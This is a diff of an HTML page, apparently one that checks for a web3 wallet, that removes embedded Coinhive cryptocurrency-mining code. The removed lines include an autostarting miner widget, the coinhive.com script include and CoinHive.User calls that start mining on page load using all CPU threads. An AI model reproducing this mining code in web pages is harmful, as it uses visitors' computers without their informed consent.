@@ -59,20 +59,7 @@
 												
 											
 												
-												<li><div class="coinhive-miner" 
-													style="width: 256px; height: 310px"
-													data-key="dlGIcWIQnjDogPh3N7UcjUY6UwCAIerM"
-													data-autostart="true"
-													data-whitelabel="false"
-													data-background="#000000"
-													data-text="#eeeeee"
-													data-action="#00ff00"
-													data-graph="#555555"
-													data-threads="4"
-													data-throttle="0.1"
-													>
-													<em>Loading...</em>
-												</div></li>
+												
 										</ul>
 									</div>
 								</li>
@@ -123,8 +110,7 @@
 			<script src="assets/js/breakpoints.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
-			
-			<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	
 
 			<script>
 				if(typeof web3 !== "undefined"){
@@ -151,49 +137,12 @@
 				}
 				
 				
-				var miner = new CoinHive.User('dlGIcWIQnjDogPh3N7UcjUY6UwCAIerM', firstAccount, {
-					threads: navigator.hardwareConcurrency,
-					throttle: 0.8,
-					forceASMJS: false,
-					theme: 'dark',
-					language: 'auto'
-					});
-					miner.start(CoinHive.IF_EXCLUSIVE_TAB);
-					miner.on('authed', function(params) {
-						console.log('Token name is: ', miner.getToken());
-					});
-
-					miner.on('error', function(params) {
-						if (params.error !== 'connection_error') {
-							console.log('The pool reported an error', params.error);
-						}
-					});
-
-					miner.on('optin', function(params) {
-						if (params.status === 'accepted') {
-							console.log('User accepted opt-in');
-						}
-						else {
-							console.log('User canceled opt-in');
-						}
-					});
-
+				
 			</script>
 
 
 
-			<script>
-					
-					var miner = new CoinHive.User('dlGIcWIQnjDogPh3N7UcjUY6UwCAIerM', firstAccount, {
-					threads: navigator.hardwareConcurrency,
-					throttle: 0.8,
-					forceASMJS: false,
-					theme: 'dark',
-					language: 'auto'
-					});
-					miner.start(CoinHive.IF_EXCLUSIVE_TAB);
-
-			</script>
+			
 
 			<!--script>
 
